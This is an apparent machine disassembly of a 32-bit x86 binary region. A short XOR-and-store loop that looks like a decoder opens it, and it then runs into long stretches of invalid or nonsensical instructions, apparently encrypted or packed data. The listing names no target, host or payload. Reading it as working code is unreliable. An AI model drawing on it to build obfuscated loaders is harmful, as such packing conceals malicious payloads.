  4060a6:	xor    edx,eax
  4060a8:	mov    BYTE PTR [ebp-0x1],dl
  4060ab:	mov    al,BYTE PTR [ebp-0x1]
  4060ae:	mov    edx,DWORD PTR [ebp-0x30]
  4060b1:	mov    ebx,DWORD PTR [ebp-0xc]
  4060b4:	xor    edx,esi
  4060b6:	add    edx,edi
  4060b8:	imul   edx,ebx
  4060bb:	mov    ebx,DWORD PTR [ebp-0x8]
  4060be:	mov    BYTE PTR [edx+ebx*1],al
  4060c1:	mov    eax,DWORD PTR [ebp-0x30]
  4060c4:	mov    edx,DWORD PTR [ebp-0xc]
  4060c7:	xor    eax,esi
  4060c9:	add    eax,edi
  4060cb:	imul   eax,edx
  4060ce:	mov    edx,DWORD PTR [ebp-0x8]
  4060d1:	jmp    0x408469
  4060d6:	leave  
  4060d7:	pop    es
  4060d8:	xchg   DWORD PTR ds:0x47490549,eax
  4060de:	(bad)  
  4060df:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4060e0:	or     bl,cl
  4060e2:	fiadd  DWORD PTR [edi-0x3e8e646b]
  4060e8:	jnp    0x406165
  4060ea:	hlt    
  4060eb:	pushf  
  4060ec:	jnp    0x406169
  4060ee:	sub    al,0x65
  4060f0:	or     esp,DWORD PTR [eax+0x2bee7734]
  4060f6:	mov    dl,0xfb
  4060f8:	jl     0x40607c
  4060fa:	bnd jg 0x4060a9
  4060fd:	jno    0x40609d
  4060ff:	or     BYTE PTR [edx],bl
  406101:	and    edx,0x3b
  406104:	dec    esp
  406105:	mov    dh,0xb5
  406107:	xor    al,0x22
  406109:	das    
  40610a:	mov    edx,DWORD PTR [eax+0x74]
  40610d:	call   0x81bac2f6
  406112:	xor    al,0xfd
  406114:	sahf   
  406115:	inc    esi
  406116:	pop    esi
  406117:	cmp    dl,0xbb
  40611a:	xor    DWORD PTR [edx-0x7b],0x8f3ea6e5
  406121:	(bad)  [ebx-0x2c8b009e]
  406127:	imul   edi,DWORD PTR [esi+0x1ae4d33a],0xae543eba
  406131:	imul   eax,esp,0x38
  406134:	pushf  
  406135:	xor    eax,edi
  406137:	cmp    esi,DWORD PTR ds:0x3aa3618
  40613d:	(bad)  
  40613e:	mov    eax,0x118e46b9
  406143:	adc    al,0xf2
  406145:	int3   
  406146:	in     al,dx
  406147:	mov    ecx,0xcc394eb
  40614c:	fs (bad) 
  40614e:	cmp    BYTE PTR [edi+0x20876add],bh
  406154:	and    dh,BYTE PTR [ebx+0x17]
  406157:	(bad)  
  406159:	cmp    cl,ah
  40615b:	dec    esp
  40615c:	mov    al,0xe9
  40615e:	jno    0x40613a
  406160:	pop    edx
  406161:	xchg   esi,eax
  406162:	jmp    0x4061d4
  406164:	(bad)  
  406165:	(bad)  
  406167:	icebp  
  406168:	fst    DWORD PTR [ebp+0x1d621fd4]
  40616e:	push   0xb40d1594
  406173:	bound  esi,QWORD PTR [edx+0x43fe75dc]
  406179:	jne    0x40619b
  40617b:	pop    esp
  40617c:	cmc    
  40617d:	sbb    BYTE PTR [eax],al
  40617f:	xor    DWORD PTR ds:0x331f5394,esi
  406185:	fldenv [ebx-0x79561354]
  40618b:	daa    
  40618c:	retf   
  40618d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40618e:	xor    DWORD PTR [edx+ebx*8-0x39d14d6],edi
  406195:	jne    0x406153
  406197:	test   ecx,esp
  406199:	(bad)  
  40619a:	pop    ebx
  40619b:	clc    
  40619c:	not    DWORD PTR [ecx+0x6e3f031b]
  4061a2:	imul   ecx,DWORD PTR [edi+0x625e98ba],0xffffffac
  4061a9:	push   esp
  4061aa:	cmp    BYTE PTR [ebp+ecx*8+0x66],dl
  4061ae:	mov    eax,0xdd1e7f93
  4061b3:	pop    es
  4061b4:	push   0x7a3a01ed
  4061b9:	cmp    esi,edx
  4061bb:	push   0xffffffb2
  4061bd:	pop    es
  4061be:	inc    edi
  4061bf:	lods   eax,DWORD PTR ds:[esi]
  4061c0:	xchg   esp,eax
  4061c1:	dec    edi
  4061c2:	sub    al,0xa
  4061c4:	outs   dx,DWORD PTR ds:[esi]
  4061c5:	cmp    ebx,DWORD PTR [esi+edi*2-0x57a290f1]
  4061cc:	cwde   
  4061cd:	inc    edx
  4061ce:	dec    ecx
  4061cf:	cld    
  4061d0:	xchg   esi,eax
  4061d1:	pop    esp
  4061d2:	iret   
  4061d3:	aas    
  4061d4:	ins    DWORD PTR es:[edi],dx
  4061d5:	mov    ecx,0x5a77ffbe
  4061da:	adc    BYTE PTR [ecx+0x18ca0849],al
  4061e0:	xchg   BYTE PTR [ebx-0x72],dl
  4061e3:	mov    ecx,0x7087d1fd
  4061e8:	jle    0x406246
  4061ea:	mov    BYTE PTR [eax+0x52],ah
  4061ed:	xor    eax,0x85947c9e
  4061f2:	push   eax
  4061f3:	es dec edx
  4061f5:	lahf   
  4061f6:	add    al,BYTE PTR [ecx+0x1b058a25]
  4061fc:	test   eax,0xd562c3eb
  406201:	ss push ss
  406203:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406204:	outs   dx,DWORD PTR ds:[esi]
  406205:	aad    0x74
  406207:	arpl   WORD PTR [ebx+0x70c40b04],sp
  40620d:	sahf   
  40620e:	call   0x718c:0xc3a82d84
  406215:	mov    ebx,0xf4dedfef
  40621a:	mov    ds,edx
  40621c:	jg     0x406268
  40621e:	mov    esi,es
  406220:	add    ebp,eax
  406222:	daa    
  406223:	push   ds
  406224:	and    eax,0x99233fb8
  406229:	pop    ebx
  40622a:	inc    ebx
  40622b:	dec    ecx
  40622c:	icebp  
  40622d:	leave  
  40622e:	sti    
  40622f:	repnz fist DWORD PTR [edx+esi*4-0x1298a6d6]
  406237:	adc    al,BYTE PTR [edi]
  406239:	repz or BYTE PTR [edi-0x4bc3e841],dl
  406240:	fiadd  WORD PTR [ebp+0x79d82046]
  406246:	xlat   BYTE PTR ds:[bx]
  406248:	jecxz  0x40622e
  40624a:	add    al,0xf4
  40624c:	jno    0x4061e5
  40624e:	aam    0x13
  406250:	mov    cl,0x5c
  406252:	lock popf 
  406254:	xor    al,0xa1
  406256:	inc    esp
  406257:	in     eax,dx
  406258:	xor    DWORD PTR [esi],esp
  40625a:	push   0xffffffaf
  40625c:	cmc    
  40625d:	test   BYTE PTR [esi+0x513821a1],al
  406263:	sbb    ecx,DWORD PTR [ecx+0x7d]
  406266:	fnsave [edi]
  406268:	adc    BYTE PTR [ebx-0x31],al
  40626b:	ins    DWORD PTR es:[edi],dx
  40626c:	jbe    0x406298
  40626e:	push   es
  40626f:	xchg   edx,eax
  406270:	sub    al,0xd8
  406272:	sub    eax,0xe7eb4640
  406277:	into   
  406278:	mov    BYTE PTR [edx-0x5a5072a8],al
  40627e:	enter  0xb85,0xb0
  406282:	inc    esi
  406283:	fsub   DWORD PTR [ebp+0x1585511e]
  406289:	arpl   WORD PTR ds:0x19e1a9fa,di
  40628f:	xchg   ebx,eax
  406290:	mul    DWORD PTR [edi+edx*1]
  406293:	loop   0x40625a
  406295:	dec    eax
  406296:	out    0x38,eax
  406298:	pop    edx
  406299:	jae    0x4062f4
  40629b:	fcmovnb st,st(4)
  40629d:	popf   
  40629e:	fidiv  WORD PTR [ebp+0x8676b5b]
  4062a4:	sbb    eax,0x7ec11277
  4062a9:	push   ebx
  4062aa:	mov    al,0x5d
  4062ac:	pop    edx
  4062ad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4062ae:	add    DWORD PTR [eax+0x2daedb74],edx
  4062b4:	daa    
  4062b5:	es fwait
  4062b7:	test   DWORD PTR [ebx],eax
  4062b9:	adc    al,0xb5
  4062bb:	push   esp
  4062bc:	jmp    0x88dfd071
  4062c1:	and    al,0x61
  4062c3:	jne    0x406314
  4062c5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4062c6:	ss cmc 
  4062c8:	in     eax,0x5a
  4062ca:	jae    0x406311
  4062cc:	mov    bl,0x67
  4062ce:	push   edx
  4062cf:	call   0x37f:0x3359a280
  4062d6:	or     eax,0x43be12f0
  4062db:	add    eax,0x376ce1b1
  4062e0:	rol    BYTE PTR [ebx+0xb],1
  4062e3:	lods   eax,DWORD PTR ds:[esi]
  4062e4:	xor    ecx,DWORD PTR [esi]
  4062e6:	mov    bl,0x9d
  4062e8:	xor    al,0xa
  4062ea:	jmp    0x40627e
  4062ec:	test   BYTE PTR [edx+ecx*8+0x1b7dff0a],al
  4062f3:	cmp    BYTE PTR [esi-0x3fb0c912],ch
  4062f9:	int    0x10
  4062fb:	push   ebp
  4062fc:	sub    BYTE PTR [edx],0xf7
  4062ff:	xchg   esp,eax
  406300:	call   0x7820:0xa6b98633
  406307:	add    al,0x69
  406309:	pcmpgtw mm1,QWORD PTR [ebx-0x39f7914]
  406310:	mov    esp,0xae8d8817
  406315:	mov    ecx,0xd7d49df2
  40631a:	sub    eax,DWORD PTR [ebp+eiz*2-0x2d]
  40631e:	inc    dl
  406320:	retf   0xdaa9
  406323:	nop
  406324:	inc    eax
  406325:	lahf   
  406326:	adc    ch,BYTE PTR [di]
  406329:	sbb    ah,cl
  40632b:	mov    edi,esi
  40632d:	inc    ecx
  40632e:	jo     0x4062e2
  406330:	cmp    DWORD PTR [edx-0x7829ad18],ebp
  406336:	in     eax,dx
  406337:	adc    bh,BYTE PTR [ecx+0x6053d646]
  40633d:	push   ebx
  40633e:	add    BYTE PTR [esi],bh
  406340:	inc    ebp
  406341:	pop    esi
  406342:	push   0x48
  406344:	sub    DWORD PTR [ebx+edx*2-0x5b311c1c],ecx
  40634b:	sub    eax,DWORD PTR [esi+ecx*1]
  40634e:	and    DWORD PTR [edi+0x2e7413b9],esi
  406354:	xchg   ebx,eax
  406355:	aad    0x92
  406357:	shl    ebp,0x34
  40635a:	xchg   ebp,eax
  40635b:	pusha  
  40635c:	fld    TBYTE PTR [edi]
  40635e:	add    ebp,0x83b8fb1f
  406364:	dec    eax
  406365:	pop    ebx
  406366:	sub    ebp,DWORD PTR [ecx+edi*8+0x78d5cf4d]
  40636d:	push   cs
  40636e:	int3   
  40636f:	retf   0x8c2e
  406372:	xchg   ebx,eax
  406373:	mov    ecx,0x8e0d4c1f
  406378:	xor    al,0xb1
  40637a:	sbb    al,bl
  40637c:	rol    DWORD PTR [edi+ebp*4],0xed
  406380:	sbb    ecx,DWORD PTR [ecx-0x62]
  406383:	sub    esi,0xbe70aae2
  406389:	out    dx,al
  40638a:	xchg   edi,eax
  40638b:	fmul   DWORD PTR [ebx]
  40638d:	fbld   TBYTE PTR [ebp+0x3b]
  406390:	repnz fld QWORD PTR gs:[ebx+0x4]
  406395:	repnz inc ebx
  406397:	clc    
  406398:	xchg   esp,eax
  406399:	push   edi
  40639a:	scas   al,BYTE PTR es:[edi]
  40639b:	dec    eax
  40639c:	add    edx,ebp
  40639e:	jp     0x406324
  4063a0:	test   BYTE PTR [ecx],cl
  4063a2:	sahf   
  4063a3:	lods   eax,DWORD PTR ds:[esi]
  4063a4:	sbb    eax,0x76c26c04
  4063a9:	add    al,0x6e
  4063ab:	popf   
  4063ac:	mov    bh,cl
  4063ae:	add    ch,bl
  4063b0:	and    esp,esp
  4063b2:	mov    eax,DWORD PTR [edi]
  4063b4:	mov    ecx,0x76799598
  4063b9:	arpl   WORD PTR [edx],bx
  4063bb:	int3   
  4063bc:	pop    esp
  4063bd:	fistp  WORD PTR [edi+eiz*8+0x77]
  4063c1:	ja     0x40635b
  4063c3:	mov    dh,0x48
  4063c5:	xor    eax,0x1833cc4c
  4063ca:	mov    bh,ch
  4063cc:	gs push ds
  4063ce:	outs   dx,DWORD PTR ds:[esi]
  4063cf:	push   esi
  4063d0:	mov    esp,0xb54c4bcc
  4063d5:	sub    esi,edx
  4063d7:	push   ebx
  4063d8:	push   edi
  4063d9:	dec    ebp
  4063da:	addr16 (bad) 
  4063dc:	retf   0x6eb9
  4063df:	sub    al,0x9
  4063e1:	mov    edi,ecx
  4063e3:	mov    ds:0x5c52c8be,eax
  4063e8:	sub    al,0xaf
  4063ea:	repz frstor [eax+edi*8+0x10]
  4063ef:	push   0xffffff95
  4063f1:	ja     0x4063b9
  4063f3:	out    0x64,eax
  4063f5:	add    edi,DWORD PTR [eax-0x6814bc97]
  4063fb:	sub    esp,0x3129558
  406401:	pop    esp
  406402:	adc    DWORD PTR [edi+ecx*2-0x44],0xffffff83
  406407:	mov    dh,0xa4
  406409:	(bad)  
  40640a:	jo     0x40645d
  40640c:	enter  0x5b2c,0xe6
  406410:	xlat   BYTE PTR ds:[ebx]
  406411:	cmp    dl,BYTE PTR [ebx+0x49]
  406414:	mov    ch,0x61
  406416:	dec    ebx
  406417:	push   0xffffff8d
  406419:	push   eax
  40641a:	mov    ah,0x68
  40641c:	pushf  
  40641d:	adc    eax,0xcb52aec5
  406422:	pop    esp
  406423:	(bad)  [ecx]
  406425:	sahf   
  406426:	xchg   DWORD PTR [ebp+0x41],ecx
  406429:	cwde   
  40642a:	dec    esi
  40642b:	mul    DWORD PTR [eax]
  40642d:	ins    DWORD PTR es:[edi],dx
  40642e:	out    0xf1,al
  406430:	push   esi
  406431:	or     BYTE PTR [edx],0xc6
  406434:	sbb    DWORD PTR [edx+0xf0d667d],eax
  40643a:	hlt    
  40643b:	or     DWORD PTR [edx+0x227ed2a5],esi
  406441:	push   ecx
  406442:	lds    edx,FWORD PTR [eax-0xba6dc09]
  406448:	(bad)  
  406449:	jl     0x406432
  40644b:	int3   
  40644c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40644d:	loop   0x406401
  40644f:	jecxz  0x4064a7
  406451:	xchg   ecx,eax
  406452:	sbb    al,0x68
  406454:	inc    edx
  406455:	and    bl,BYTE PTR [ebp-0x4fc40e9]
  40645b:	fmul   QWORD PTR [ebp+0x5092cc82]
  406461:	stos   BYTE PTR es:[edi],al
  406462:	shl    BYTE PTR [eax+edx*8],1
  406465:	icebp  
  406466:	mov    DWORD PTR [eax+0x3f],edx
  406469:	test   DWORD PTR ds:0x51c1bf7b,eax
  40646f:	inc    esp
  406470:	call   0x9105f272
  406475:	jbe    0x406499
  406477:	sbb    BYTE PTR [edi],al
  406479:	mov    ebx,0xd73b7f96
  40647e:	outs   dx,BYTE PTR ds:[esi]
  40647f:	add    BYTE PTR [esi-0x722dc399],0x7e
  406486:	mov    ecx,0xbaa7540d
  40648b:	aaa    
  40648c:	mov    ecx,0x5496df2b
  406491:	(bad)  
  406493:	jnp    0x4064af
  406495:	loop   0x40642e
  406497:	and    edx,DWORD PTR [ecx-0x1a]
  40649a:	add    eax,0xe83083cc
  40649f:	ficomp WORD PTR [ebx-0x8f35ddc]
  4064a5:	outs   dx,BYTE PTR ds:[esi]
  4064a6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4064a7:	fst    DWORD PTR [ebx+0x58]
  4064aa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4064ab:	cdq    
  4064ac:	or     DWORD PTR [eax],ebp
  4064ae:	sbb    al,0x66
  4064b0:	pop    eax
  4064b1:	shr    ebp,1
  4064b3:	jo     0x406465
  4064b5:	pop    eax
  4064b6:	xchg   edx,eax
  4064b7:	bound  eax,QWORD PTR [edi+0x3c]
  4064ba:	add    eax,0x5c19c903
  4064bf:	test   al,0xdb
  4064c1:	sub    eax,0x75eeee5a
  4064c6:	les    esp,FWORD PTR [eax+0x63]
  4064c9:	ds and al,0x4f
  4064cc:	out    0x68,al
  4064ce:	lahf   
  4064cf:	loope  0x406500
  4064d1:	sbb    al,BYTE PTR [ebx+0x6f381633]
  4064d7:	push   ebx
  4064d8:	cmp    eax,0x22475c23
  4064dd:	iret   
  4064de:	jp     0x40649b
  4064e0:	hlt    
  4064e1:	xchg   esp,eax
  4064e2:	jmp    0xd8a83d81
  4064e7:	sub    al,0xb6
  4064e9:	mov    ebp,0x19229e8b
  4064ee:	enter  0x5e48,0xdf
  4064f2:	es or  al,0x57
  4064f5:	xchg   BYTE PTR [edx+0x4],ah
  4064f8:	jb     0x406577
  4064fa:	push   ss
  4064fb:	jle    0x4064eb
  4064fd:	mov    ebx,0x2ae2770c
  406502:	xchg   DWORD PTR [esi-0x4f8d35b2],edx
  406508:	sbb    eax,0x3490df3
  40650d:	cmc    
  40650e:	jecxz  0x406519
  406510:	aaa    
  406511:	repnz inc edi
  406513:	cs pop ds
  406515:	xchg   esi,eax
  406516:	fcomip st,st(7)
  406518:	jmp    0x7e2fcf4
  40651d:	xchg   esp,eax
  40651e:	out    dx,eax
  40651f:	rcl    BYTE PTR [eax+0x72c4658b],cl
  406525:	addr16 xor eax,0x7bf2ae1f
  40652b:	ficomp WORD PTR [ecx*2-0x780a59a4]
  406532:	into   
  406533:	das    
  406534:	and    ah,ch
  406536:	jl     0x406565
  406538:	cmp    eax,0x3e4981ba
  40653d:	jmp    0x40653f
  40653f:	out    0x7c,al
  406541:	xchg   edx,eax
  406542:	test   DWORD PTR [ebp-0x7b660beb],edi
  406548:	mov    esp,0xe5fd6593
  40654d:	jmp    0x2bbd:0x5c6d8620
  406554:	mov    dl,0x9
  406556:	dec    ebx
  406557:	cwd    
  406559:	mov    DWORD PTR [ebp-0x60],ebx
  40655c:	sub    eax,DWORD PTR [ecx]
  40655e:	inc    ecx
  40655f:	jo     0x40656c
  406561:	xor    dh,BYTE PTR [ebx+0x36]
  406564:	dec    ebx
  406565:	or     DWORD PTR [eax],edx
  406567:	das    
  406568:	iret   
  406569:	adc    ah,BYTE PTR [edx-0x61]
  40656c:	std    
  40656d:	popf   
  40656e:	xor    esi,DWORD PTR [ebx+0x7ede3141]
  406574:	push   ecx
  406575:	xor    eax,0xec2f842e
  40657a:	cmp    BYTE PTR [esi-0x4853f64e],dh
  406580:	cmp    DWORD PTR [esi],0xffffffdf
  406583:	outs   dx,DWORD PTR ds:[esi]
  406584:	mov    dh,0x1a
  406586:	pop    esi
  406587:	cli    
  406588:	mov    WORD PTR [eax],es
  40658a:	jne    0x40658f
  40658c:	xchg   esp,eax
  40658d:	cmc    
  40658e:	push   ds
  40658f:	pop    eax
  406590:	mov    al,BYTE PTR [esi-0x38]
  406593:	inc    edi
  406594:	adc    ecx,DWORD PTR [edi+0x56cf6d03]
  40659a:	mov    al,0x57
  40659c:	dec    esi
  40659d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40659e:	in     al,0x73
  4065a0:	mov    dl,0x29
  4065a2:	cld    
  4065a3:	xor    esi,DWORD PTR [edi+0x58c3a97e]
  4065a9:	fcomi  st,st(1)
  4065ab:	repz cli 
  4065ad:	repz xor DWORD PTR [edx],esp
  4065b0:	pop    ebp
  4065b1:	outs   dx,DWORD PTR ds:[esi]
  4065b2:	loopne 0x40659a
  4065b4:	push   cs
  4065b5:	xchg   esi,eax
  4065b6:	sahf   
  4065b7:	loope  0x4065ea
  4065b9:	lock cdq 
  4065bb:	xchg   esp,eax
  4065bc:	aad    0x44
  4065be:	add    BYTE PTR [eax+ebx*8-0x401a755c],dl
  4065c5:	xor    ebp,DWORD PTR [ebp-0x73]
  4065c8:	push   edi
  4065c9:	outs   dx,BYTE PTR ds:[esi]
  4065ca:	mov    bl,0xdf
  4065cc:	jecxz  0x406579
  4065ce:	mov    dl,0xbe
  4065d0:	and    ecx,ecx
  4065d2:	adc    ebx,DWORD PTR [esi]
  4065d4:	jg     0x406560
  4065d6:	retf   0x2599
  4065d9:	jp     0x40662c
  4065db:	dec    eax
  4065dc:	adc    bl,BYTE PTR [ebx+0x16edd472]
  4065e2:	(bad)  
  4065e3:	(bad)  
  4065e4:	pusha  
  4065e5:	imul   ebx,esi,0xdae2030a
  4065eb:	sub    al,0x53
  4065ed:	popa   
  4065ee:	repz pop ebp
  4065f0:	cmp    ebp,0x3dc154eb
  4065f6:	pmaddwd mm7,mm2
  4065f9:	imul   edx,DWORD PTR [ebp-0x6a],0x7a590584
  406600:	gs mov ebp,0x6a955512
  406606:	in     al,0x7d
  406608:	ins    DWORD PTR es:[edi],dx
  406609:	xchg   edx,eax
  40660a:	xchg   ecx,eax
  40660b:	sbb    BYTE PTR [ebx-0x7646efd6],al
  406611:	push   edi
  406612:	cli    
  406613:	cwde   
  406614:	push   0x4f
  406616:	leave  
  406617:	dec    edi
  406618:	pusha  
  406619:	dec    edx
  40661a:	sahf   
  40661b:	xchg   BYTE PTR [eax],al
  40661d:	aad    0xc
  40661f:	pop    ebx
  406620:	push   edi
  406621:	popf   
  406622:	repz ret 0x15fe
  406626:	jge    0x406645
  406628:	sub    ch,0x9c
  40662b:	je     0x4065ba
  40662d:	or     al,0xad
  40662f:	add    esp,DWORD PTR [ecx]
  406631:	ds cmp al,0xef
  406634:	fisub  WORD PTR cs:[ebx]
  406637:	scas   al,BYTE PTR es:[edi]
  406638:	ss dec edx
  40663a:	push   ss
  40663b:	xor    al,0xa6
  40663d:	les    edi,FWORD PTR [ebp-0x43]
  406640:	out    0xf4,al
  406642:	idiv   DWORD PTR [edx+ebx*2-0x25]
  406646:	mov    eax,DWORD PTR [eax+0x1b]
  406649:	pop    edx
  40664a:	ret    
  40664b:	popa   
  40664c:	jl     0x40669d
  40664e:	adc    esi,DWORD PTR [ebp-0x15]
  406651:	and    al,0xee
  406653:	mov    cl,0xc
  406655:	push   ebx
  406656:	repnz mov ebp,0x6952cf6b
  40665c:	fnstcw WORD PTR [edi-0x59ed2f72]
  406662:	outs   dx,BYTE PTR ds:[esi]
  406663:	inc    esi
  406664:	ror    BYTE PTR [esi-0x60],cl
  406667:	div    DWORD PTR [ebp-0x2b]
  40666a:	xor    cl,BYTE PTR [edi+0x206d9742]
  406670:	push   esi
  406671:	out    dx,eax
  406672:	lock loope 0x406687
  406675:	jecxz  0x4066bb
  406677:	xchg   esp,eax
  406678:	retf   0x6f21
  40667b:	imul   ecx,DWORD PTR [edx-0x280a65d6],0x71
  406682:	popf   
  406683:	aaa    
  406684:	lock cmp ecx,DWORD PTR ds:0xd524b0fa
  40668b:	inc    edi
  40668c:	pop    es
  40668d:	sbb    DWORD PTR ds:0x4c90401,esp
  406693:	div    dl
  406695:	and    BYTE PTR [ebp+0x2e89649c],bl
  40669b:	imul   ecx,esp,0xffffffab
  40669e:	lds    ecx,FWORD PTR [ecx-0x5d9cde9d]
  4066a4:	jbe    0x4066ae
  4066a6:	lahf   
  4066a7:	inc    ebp
  4066a8:	push   0xe307f7a5
  4066ad:	nop
  4066ae:	mov    ecx,0xd00c5e00
  4066b3:	(bad)  
  4066b5:	ins    DWORD PTR es:[edi],dx
  4066b6:	(bad)  
  4066b7:	sahf   
  4066b8:	cs enter 0x9de6,0xd9
  4066bd:	xchg   ecx,eax
  4066be:	test   BYTE PTR [ecx+eax*1],al
  4066c1:	mov    edi,0x264c07e0
  4066c6:	jae    0x406722
  4066c8:	loop   0x406688
  4066ca:	jbe    0x406698
  4066cc:	xlat   BYTE PTR ds:[ebx]
  4066cd:	loop   0x406694
  4066cf:	pusha  
  4066d0:	cs int 0x20
  4066d3:	mov    edi,0x5c017d8
  4066d8:	mov    edx,0x5b72dee1
  4066dd:	lods   eax,DWORD PTR ds:[esi]
  4066de:	add    al,0xb3
  4066e0:	mul    BYTE PTR [esi+0x5a34d82d]
  4066e6:	add    BYTE PTR [ebp+0x22a69875],dl
  4066ec:	aas    
  4066ed:	pop    ebx
  4066ee:	fdivr  DWORD PTR [ebx-0x3f7e219f]
  4066f4:	mov    ecx,DWORD PTR [ecx]
  4066f6:	pop    ebp
  4066f7:	adc    ebp,eax
  4066f9:	in     eax,0x46
  4066fb:	popf   
  4066fc:	loop   0x40672e
  4066fe:	fwait
  4066ff:	loope  0x406758
  406701:	(bad)  
  406703:	mov    cl,0x4f
  406705:	cwde   
  406706:	xchg   edi,eax
  406707:	rcr    ecx,0xc3
  40670a:	pop    DWORD PTR [ebp+0x3d]
  40670d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40670e:	xchg   edx,eax
  40670f:	dec    BYTE PTR [esi+0x34]
  406712:	jb     0x40676f
  406714:	das    
  406715:	(bad)  
  406716:	test   BYTE PTR [edx+0x3c],0x97
  40671a:	and    eax,DWORD PTR [esi]
  40671c:	mov    edi,0x1f912c76
  406721:	les    esp,FWORD PTR [ecx]
  406723:	imul   edx,DWORD PTR [ecx],0xfffffff5
  406726:	fsubr  QWORD PTR [edi+0x5a]
  406729:	mov    al,0x25
  40672b:	jb     0x40672b
  40672d:	sub    eax,0x715f4302
  406732:	data16 sbb cl,BYTE PTR [ebx+eiz*1+0x71e9b18b]
  40673a:	inc    esp
  40673b:	pop    ds
  40673c:	sti    
  40673d:	adc    esi,esp
  40673f:	inc    ebx
  406740:	and    dh,0xa0
  406743:	fs push cs
  406745:	test   WORD PTR [ebx+esi*4],ax
  406749:	mov    BYTE PTR [edx+eax*8+0x7dbac5fc],ch
  406750:	mov    ch,0xf
  406752:	push   ds
  406753:	outs   dx,BYTE PTR ds:[esi]
  406754:	jg     0x406740
  406756:	call   0x34cfbe3
  40675b:	in     eax,dx
  40675c:	aam    0xc8
  40675e:	push   eax
  40675f:	imul   eax,DWORD PTR [ebp+0x64],0xffffff84
  406763:	mov    eax,ds:0x19a607e2
  406768:	jge    0x40677d
  40676a:	xchg   ecx,eax
  40676b:	inc    edx
  40676c:	(bad)  
  40676e:	je     0x40671a
  406770:	(bad)  [ebx+0x48]
  406773:	sahf   
  406774:	adc    BYTE PTR [edi+0x60c1a166],bl
  40677a:	jle    0x40675e
  40677c:	inc    edx
  40677d:	out    dx,eax
  40677e:	cmp    DWORD PTR [edi+0x6b41970b],ecx
  406784:	cmp    al,BYTE PTR ds:0x5736b01
  40678a:	add    edi,DWORD PTR [eax]
  40678c:	pop    esi
  40678d:	out    dx,eax
  40678e:	sbb    DWORD PTR [edx+0x7ac6e428],esp
  406794:	mov    esp,0x4fe62ab6
  406799:	xchg   BYTE PTR [ebx+0x5],al
  40679c:	adc    ebp,DWORD PTR [ebx+0x45]
  40679f:	mov    edi,0xab921bad
  4067a4:	cdq    
  4067a5:	fist   DWORD PTR [esi+eiz*1]
  4067a8:	mov    dl,0x55
  4067aa:	fld    QWORD PTR [esi+0x3f]
  4067ad:	int3   
  4067ae:	outs   dx,BYTE PTR ds:[esi]
  4067af:	fisubr WORD PTR [ebx]
  4067b1:	arpl   WORD PTR [ebx+eax*8+0x39],sp
  4067b5:	pop    ss
  4067b6:	cmp    ah,BYTE PTR [ecx+0x42e9e119]
  4067bc:	loope  0x40677a
  4067be:	pop    eax
  4067bf:	inc    edi
  4067c0:	aaa    
  4067c1:	fwait
  4067c2:	enter  0x5593,0x79
  4067c6:	imul   esp,ecx,0x4af32deb
  4067cc:	pop    esp
  4067cd:	sbb    al,0xe0
  4067cf:	fimul  DWORD PTR [edx+eiz*2-0x5c0cb9f6]
  4067d6:	add    DWORD PTR [eax],edi
  4067d8:	push   esi
  4067d9:	aad    0xbd
  4067db:	xchg   esi,eax
  4067dc:	and    dh,bh
  4067de:	cmp    edx,DWORD PTR [eax+0x4]
  4067e1:	sub    BYTE PTR [edx+0xaef8102],ah
  4067e7:	mov    eax,0x5e2d5ea1
  4067ec:	inc    BYTE PTR [edi-0x30ec944a]
  4067f2:	and    al,0x4b
  4067f4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4067f5:	ins    BYTE PTR es:[edi],dx
  4067f6:	jp     0x40682f
  4067f8:	or     DWORD PTR [esi+0x56],ebx
  4067fb:	sub    dl,BYTE PTR [edi+0x38311d56]
  406801:	jno    0x4067f1
  406803:	test   al,0x67
  406805:	(bad)  
  406806:	xlat   BYTE PTR ds:[ebx]
  406807:	retf   
  406808:	inc    eax
  406809:	clc    
  40680a:	sahf   
  40680b:	adc    BYTE PTR [esi-0x64abc775],ah
  406811:	aad    0xe
  406813:	dec    BYTE PTR [ebx+0x51]
  406816:	and    al,0xde
  406818:	sbb    BYTE PTR [ecx+0x2a42f81],dl
  40681e:	ins    BYTE PTR es:[edi],dx
  40681f:	sahf   
  406820:	mov    edi,0xe276a8e
  406825:	nop
  406826:	sbb    cl,dl
  406828:	test   DWORD PTR [eax+0x2b4a77ed],esi
  40682e:	ds sub ebp,ebx
  406831:	mov    ecx,0x7ebbc84c
  406836:	imul   ecx,DWORD PTR [edi+0x18],0x3e866f1a
  40683d:	xor    esp,DWORD PTR [edx+0x52]
  406840:	pusha  
  406841:	pop    ss
  406842:	dec    edx
  406843:	mov    ah,0x8e
  406845:	mov    DWORD PTR [edx],ebp
  406847:	mov    ds:0xf0fe38c5,al
  40684c:	sahf   
  40684d:	pop    esp
  40684e:	lods   eax,DWORD PTR ds:[si]
  406850:	xor    ecx,DWORD PTR [ebx]
  406852:	mov    eax,0xd26f8f2
  406857:	adc    BYTE PTR [ebx+0x3c],0x5b
  40685b:	shl    DWORD PTR [ebx-0x60],cl
  40685e:	or     al,0xa6
  406860:	lahf   
  406861:	sub    BYTE PTR [ebp+0x34],bl
  406864:	cdq    
  406865:	push   ebx
  406866:	popa   
  406867:	fdivrp st(0),st
  406869:	inc    ebp
  40686a:	inc    esp
  40686b:	dec    eax
  40686c:	sub    dh,BYTE PTR ds:0x40e71a67
  406872:	mov    esp,0xb187f589
  406877:	sub    BYTE PTR [ebp-0x38fbe9c2],dh
  40687d:	jecxz  0x406864
  40687f:	mov    WORD PTR [ecx+0x29f362ee],es
  406885:	xchg   ebx,eax
  406886:	int    0x3
  406888:	jns    0x406894
  40688a:	in     al,0x6c
  40688c:	push   ebx
  40688d:	inc    ecx
  40688e:	add    bl,cl
  406890:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406891:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406892:	jl     0x40687e
